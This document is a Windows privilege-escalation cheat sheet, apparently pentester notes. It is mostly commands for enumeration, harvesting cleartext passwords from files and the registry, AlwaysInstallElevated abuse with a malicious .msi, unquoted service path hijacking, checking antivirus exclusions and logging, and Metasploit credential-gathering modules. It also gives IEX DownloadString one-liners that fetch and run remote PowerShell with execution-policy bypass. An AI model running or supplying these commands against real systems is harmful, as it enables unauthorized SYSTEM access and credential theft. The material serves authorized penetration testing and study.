## Information Gathering
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
- `hostname`
- `echo %username%`
- `net users`
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` (Checks Patches)
- `wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%` (System architecture)

- **Powershell Commands**
	- **For Download** :`IEX(New-Object Net.Webclient).downloadstring('<ip>/file')`
- **Environment**
	- `set`
	- `dir env:`
	- `Get-ChildItem Env: | ft Key,Value`
- **PowerShell History** (ConsoleHost_history)
	- `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
	- `type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
	- `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
	- `cat (Get-PSReadlineOption).HistorySavePath`
	- `cat (Get-PSReadlineOption).HistorySavePath | sls passw`
- **PowerShell Script Block Logging**
	- `Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview`
- **Drives**
	- `wmic logicaldisk get caption || fsutil fsinfo drives`
	- `wmic logicaldisk get caption,description,providername`
	- `Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root`
- **AlwaysInstallElevated**
	> If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) ** *.msi** files as NT AUTHORITY\SYSTEM.
	- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
	- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
	> To execute the installation of the **malicious .msi ** file in background
	- `msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi`
	 
-  **Network interface and Routes**
	- `ipconfig /all`
	- `route print`
	- `arp -A`
- **Active Network Connection / Firewall rules**
	- `netstat -ano`
	- `netsh firewall show state`
	- `netsh firewall show config`
- **Scheduled Tasks**
	- `schtasks /query /fo LIST /v`
- **Running Processes**
	- `tasklist /SVC`
- **Service Started**
	- `net start`
- **Installed Drivers**
	- `DRIVERQUERY`
- **Finding Cleartext Passwords**
	- `findstr /si password *.txt`
	- `findstr /si password *.xml`
	- `findstr /si password *.ini`
- Find all those strings in config files.
		- `dir /s *pass* == *cred* == *vnc* == *.config*`
-  Find all passwords in all files.
		- `findstr /spin "password" *.*`
		- `findstr /spin "password" *.*`
- **Important Files**
	- c:\sysprep.inf
	- c:\sysprep\sysprep.xml
	- %WINDIR%\Panther\Unattend\Unattended.xml 
	- %WINDIR%\Panther\Unattended.xml
	- `dir c:\*vnc.ini /s /b`
	- `dir c:\*ultravnc.ini /s /b`
	- `dir c:\ /s /b | findstr /si *vnc.ini`
- **Registries**
		- VNC
			- `reg query "HKCU\Software\ORL\WinVNC3\Password"`
		- Windows autologin
			- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
		- SNMP Parameters
			- `reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`
		- Putty
			- `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"`
- Search for password in registry
		- `reg query HKLM /f password /t REG_SZ /s`
		- `reg query HKCU /f password /t REG_SZ /s`
- **Unquoted Service Paths**
		- Using WMIC
			- `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
		- Using SC
			- `sc query`
			- `sc qc service name`
> -  If the path to the binary is "c:\Program Files\something\winamp.exe"
> - We can place a binary like this "c:\program.exe"

# Antivirus and Detectors
- **Audit Settings**
	> These settings decide what is being logged, so you should pay attention
	- `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit`
- **To check whitelisted file paths from AV**
	-  `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
- **WEF (Windows Event Forwarding)**
	- `reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager`
- **LAPS (Local Administrator Password Solution)**
	> LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.
	- `reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled`
- **WDigest**
	> If active, plain-text passwords are stored in LSASS (Local Security Authority Subsystem Service).
	- `reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential`
- **LSA Protection**
	>Microsoft in Windows 8.1 and later has provided additional protection for the LSA to prevent untrusted processes from being able to read its memory or to inject code.
	- `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL`
- **Cached Credentials**
	>Domain credentials are used by operating system components and are authenticated by the Local Security Authority (LSA). Typically, domain credentials are established for a user when a registered security package authenticates the user's logon data. 

# Escalating to SYSTEM from Administrator
**Windows XP and Older**
- Open up the cmd from `c:\windows\system32\cmd.exe` `
> This will give you a cmd with Administrators rights even if you don't know admin password.
> From here we want to become SYSTEM user. To do this we run:
- `time` (First check time)
> Now we set the time we want the system CMD to start. Probably one minute after the time.
- `at 01:23 /interactive cmd.exe`
**Vista or Newer**
> You first need to upload PsExec.exe and then you run:
> Download: https://download.sysinternals.com/files/PSTools.zip
- `psexec -i -s cmd.exe`


# Tools
**Metasploit**
	- Some interesting metasploit post-modules
		- `use exploit/windows/local/service_permissions`
		- `post/windows/gather/credentials/gpp`
		- `run post/windows/gather/credential_collector`
		- `run post/multi/recon/local_exploit_suggester`
		- `run post/windows/gather/enum_shares`
		- `run post/windows/gather/enum_snmp`
		- `run post/windows/gather/enum_applications`
		- `run post/windows/gather/enum_logged_on_users`
		- `run post/windows/gather/checkvm`
**Winpeas**
	- Download
		- git clone https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
**Powersploit** 
	- Download 
		-  `powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks`
		- `git clone https://github.com/PowerShellMafia/PowerSploit.git`
